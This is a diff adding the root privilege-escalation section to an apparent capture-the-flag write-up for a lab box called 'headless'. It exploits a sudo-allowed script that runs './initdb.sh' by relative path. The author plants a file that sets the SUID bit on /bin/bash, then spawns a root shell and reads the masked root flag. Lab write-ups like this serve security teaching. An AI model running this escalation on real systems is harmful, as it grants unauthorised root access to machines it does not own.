@@ -140,3 +140,63 @@ bash-5.2$ cat user.txt
 cat user.txt
 c0****************************22
 ```
+
+## Root privileges escalation
+
+Next step is to discover potential ways to escalate privileges. Simple check on sudo permissions was sufficient:
+
+```bash
+bash-5.2$ sudo -l
+Matching Defaults entries for dvir on headless:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+User dvir may run the following commands on headless:
+    (ALL) NOPASSWD: /usr/bin/syscheck
+```
+
+As I found out, the `syscheck` script is trying to call some database initialization script that cannot be found on the box:
+
+```bash
+bash-5.2$ cat /usr/bin/syscheck
+#!/bin/bash
+
+... SNIP ...
+
+if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
+  /usr/bin/echo "Database service is not running. Starting it..."
+  ./initdb.sh 2>/dev/null
+else
+  /usr/bin/echo "Database service is running."
+fi
+
+exit 0
+```
+
+As the script runs with sudo privileges, we can create the `initdb.sh` script and insert a content that would give us an access to elevated shell, like:
+
+```bash
+bash-5.2$ echo 'chmod u+s /bin/bash' > initdb.sh
+bash-5.2$ chmod +x initdb.sh 
+```
+
+And execute the `syscheck` with sudo:
+
+```bash
+bash-5.2$ sudo /usr/bin/syscheck
+Last Kernel Modification Time: 01/02/2024 10:05
+Available disk space: 2.0G
+System load average:  0.03, 0.03, 0.00
+Database service is not running. Starting it...
+bash-5.2$ /bin/bash -p
+bash-5.2# id
+uid=1000(dvir) gid=1000(dvir) euid=0(root) groups=1000(dvir),100(users)
+```
+
+This way we can access the root flag:
+
+```bash
+bash-5.2# cat /root/root.txt
+1e0d************************0238
+```
